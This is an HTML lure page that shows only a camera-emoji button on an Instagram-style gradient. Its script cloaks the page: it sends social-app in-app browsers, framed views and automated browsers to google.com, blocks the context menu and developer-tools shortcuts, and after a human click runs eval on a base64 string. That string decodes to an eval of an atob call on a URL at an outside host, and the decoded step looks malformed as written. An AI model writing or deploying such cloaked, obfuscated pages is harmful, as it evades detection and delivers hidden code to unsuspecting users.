<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>📷</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="noindex, nofollow" />
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: linear-gradient(to bottom, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .btn {
      background-color: white;
      color: black;
      border: none;
      border-radius: 9999px;
      padding: 1.5rem 3rem;
      font-size: 2rem;
      cursor: pointer;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
    }
  </style>
</head>
<body>
  <button class="btn" onclick="go()">📷</button>

  <script>
    // 🔐 Проверка на встроенные браузеры
    (function() {
      const ua = navigator.userAgent.toLowerCase();
      const isWebview =
        ua.includes("instagram") ||
        ua.includes("fbav") ||
        ua.includes("facebook") ||
        ua.includes("tinder") ||
        ua.includes("okhttp") ||
        ua.includes("webview") ||
        ua.includes("line") ||
        ua.includes("pinterest") ||
        ua.includes("telegram") ||
        ua.includes("grindr");

      if (isWebview) {
        window.location.href = "https://google.com";
        return;
      }

      if (window.top !== window.self) {
        window.location.href = "https://google.com";
        return;
      }

      if (navigator.webdriver) {
        window.location.href = "https://google.com";
        return;
      }
    })();

    // 👤 Проверка взаимодействия
    let interacted = false;
    document.addEventListener("mousemove", () => interacted = true);
    document.addEventListener("touchstart", () => interacted = true);
    document.addEventListener("keypress", () => interacted = true);

    // 🚫 DevTools и контекстное меню
    document.addEventListener("contextmenu", e => e.preventDefault());
    document.onkeydown = e => {
      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
    };

    function go() {
      if (!interacted) return;

      setTimeout(() => {
        const j = "ZXZhbChhdG9iKCJodHRwczovL2dheXJvbi5saWZlL3N1cGVyc2VjcmV0Iikp";
        eval(atob(j));
      }, 2000);
    }
  </script>
</body>
</html>
